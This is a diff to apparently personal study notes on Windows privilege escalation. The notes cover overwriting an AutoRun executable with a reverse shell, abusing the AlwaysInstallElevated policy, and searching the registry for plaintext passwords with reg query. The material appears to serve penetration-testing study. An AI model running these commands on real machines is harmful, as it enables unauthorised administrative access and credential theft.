@@ -74,6 +74,7 @@ Windows allows users to set specific programs to automatically start whenever th
 > copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe                                          ---> Copy our reverse shell executable to overwrite the AutoRun executable
 
 2----AlwaysInstallElevated ----
+The AlwaysInstallElevated is a Windows policy that allows unprivileged users to install software through the use of MSI packages using SYSTEM level permissions, which can be exploited to gain administrative access over a Windows machine.
 
 > .\winPEASany.exe quiet windowscreds                                                                                   ---> Use winPEAS to see if both registry values are set.
 > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated                                 ---> verify to see if both registry values are set manually
@@ -88,8 +89,9 @@ explain the switches:
 -------------------- Passwords --------------------
 Windows itself sometimes will store passwords in plaintext in the Registry.
 
-> reg query HKLM /f password /t REG_SZ /s
-> reg query HKCU /f password /t REG_SZ /s
+> reg query HKLM /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password”
+> reg query HKCU /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password”
+
 
 
 
